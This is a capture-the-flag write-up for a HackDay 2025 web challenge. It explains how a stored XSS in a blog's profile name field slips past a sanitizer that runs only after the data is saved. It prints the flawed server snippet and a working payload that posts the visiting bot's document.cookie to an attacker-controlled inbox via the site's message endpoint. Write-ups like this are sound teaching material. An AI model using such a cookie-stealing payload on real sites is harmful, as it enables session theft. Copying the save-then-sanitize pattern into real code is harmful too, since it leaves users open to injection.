# The Internal Blog 
<p align="justify">The goal of this Web challenge was to find a way to steal bot's cookies. To do so, a blog website was deployed and vulnerable to XSS attack. No specific informations were provided in the description of the challenge, no source files were provided.</p>

<p align="center"> 
  <img src="Screenshots/S1.png" style="width:50%">
</p>

<p align="justify">The first step was the recon stage. Indeed, before perform any XSS and trick the bot, the field vulnerable had to be found. Actually the blog site offered many possible fields : </p>

- **Registration route** : Profiles were created with token here, contact ID, Name, Username, Location, Description
- **Article route** : Article were released here. To publish account token, content andtitle were required
- **Message route** : Messages were sent here. To send message contact ID and content were required

<p align="justify">Hence it seemed that many fields could have potentientially been exploited to perform XSS. Nonetheless given the hints printed on the home page, it reduced the scope to the profile : </p>

<p align="center"> 
  <img src="Screenshots/S2.png" >
</p>

<p align="justify">Indeed, regarding articles released by Administrator, the bot was visiting the profile only. So it meant the payload should have been stored on user profile. At this step, the goal was to identify the target field. Hence the first thing to do was to inject simple javascript tag in each field at registration to see how they were reflected once the profile created. Injecting the profile creation, it appeared that the profile creation was submitted to sanitize fonction, to counter XSS injection : </p>

<p align="center"> 
  <img src="Screenshots/S3.png" >
</p>

<p align="justify">Thanks to the leak provided as a hint, it appeared that the filter actually useless beacause the filter function was called after the profile created was saved and written into the database as show in the snippet below : </p>

````javascript
await newProfile.save();

        const isXSSDetected = sanitizeJson(profileData, res);
        if (isXSSDetected) return;

        console.log('Profile created :', profileData);
        res.redirect(`/user?token=${token}`);
    } catch (err) {
        console.error('Error while creating profile :', err);
        res.status(500).send('Error while creating profile.');
    }
````

<p align="justify">Hence, it was possible to access the profile containing javascript payload, despite filter function. It seemed it was actually the name field in the registration form which was vulnerable to XSS and reflected the javascript payload : </p>

<p align="center"> 
  <img src="Screenshots/S4.png" >
</p>

<p align="justify">After the name field was identified, a fetch to request endpoint triggered a CSP applied to user profile page. To get the flag and trap the bot, a bypass was required. 2 solutions where possible : </p>
  
- Using a redirection payload
- Using message feature to send the flag on a controlled profile, using contact ID
  
<p align="center"> 
  <img src="Screenshots/S5.png" >
</p>

<p align="justify">The payload below triggered the bot, forcing it to send the flag in message on a controlled profile. Once the profile created with the payload as name, as mentionned in the articles released by Administrator, it was necessary to publish an article and get a visit from the bot. </p>

````javascript
script>
  fetch('http://localhost:3000/sendmessage', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
      contact: 'c87531e5-c979-4625-9966-45478ecf17f1', 
      message: document.cookie, 
    }),
  });
</script>
````

<p align="justify">Once the profile created containing the payload and an article realeased using the token associated, the flag is finally sent as a message : </p>

<p align="center"> 
  <img src="Screenshots/S6.png" style="width:50%" >
</p>

_FLAG=HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}_  <a href="https://github.com/Ax8457/HACKDAY/tree/main/Hackday2025/Qualif">Source files available here</a>
